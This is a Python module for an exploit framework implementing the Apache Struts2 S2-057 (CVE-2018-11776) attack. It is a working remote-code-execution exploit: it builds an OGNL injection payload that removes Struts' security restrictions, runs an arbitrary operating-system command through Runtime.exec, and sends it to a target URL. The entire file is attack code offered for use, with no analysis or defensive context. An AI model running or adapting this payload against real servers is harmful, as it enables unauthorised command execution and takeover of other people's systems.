#!/usr/bin/python
# -*- coding:utf8 -*-
from zerooosploit.exploits import ExploitAggregate
from zerooosploit.color import *
from urllib.parse import quote
import requests
import re


class Zerooosploit(ExploitAggregate):

    def __init__(self):
        super(self.__class__, self).__init__()
        self.info = {
            'name': 'S2-057',
            'product': 'struts2',
            'authors': '01sec',
            'ref': 'https://xz.aliyun.com/t/2618',
            'cve': 'CVE-2018-11776',
            'create_date': '2019-09-18'
        }

        self.option = {
            'url': {'default': 'http://127.0.0.1:8080/'},
            'command': {'default': 'id'}
        }

    def exploit(self):
        url = self.get_options('url')
        command = self.get_options('command')
        payload = quote('''${
        (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('%s')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}
        ''' % command)

        vul_url = url + '/struts2-showcase/' + payload + '/actionChain1.action'
        r = requests.get(url=vul_url, allow_redirects=False, timeout=60)
        if r.status_code == 302:
            req = re.findall('/struts2-showcase/(.*?)/register2.action', str(r.headers))
            print_green('[+] Exploit succeed, ' + str(req))
            print_blue('[*] Exploit completed')
        else:
            print_blue('[*] Exploit completed')
